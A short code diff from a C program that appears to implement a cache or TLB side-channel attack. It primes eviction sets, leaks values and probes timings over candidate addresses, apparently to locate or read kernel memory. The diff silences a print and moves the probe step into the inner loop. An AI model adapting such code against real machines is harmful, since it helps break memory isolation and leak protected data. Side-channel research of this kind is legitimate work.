@@ -156,7 +156,7 @@ int main(int argc, char *argv[]) {
       //printf("  [+] %lu/%lu\n", s_idx, NUM_SLOT);
       idx = (s_idx * 73) % NUM_SLOT;
       addr = (void *)START_SEARCH + (ALIGN_SIZE * idx);
-      printf("Trying %p\n", addr);
+      // printf("Trying %p\n", addr);
       gen_eset((size_t)addr, eset, (uintptr_t)flush_set);
       gen_fake_eset_stlb((uintptr_t)addr, kern_eset);
       for (int fa_idx = 0; fa_idx < FAKE_ESET_ACCESSES; fa_idx++) {
@@ -165,8 +165,8 @@ int main(int argc, char *argv[]) {
           prime(eset);
           leak_val(target[j]);
         }
+	res[idx] += probe(eset);
       }
-      res[idx] += probe(eset);
     }
   }
 
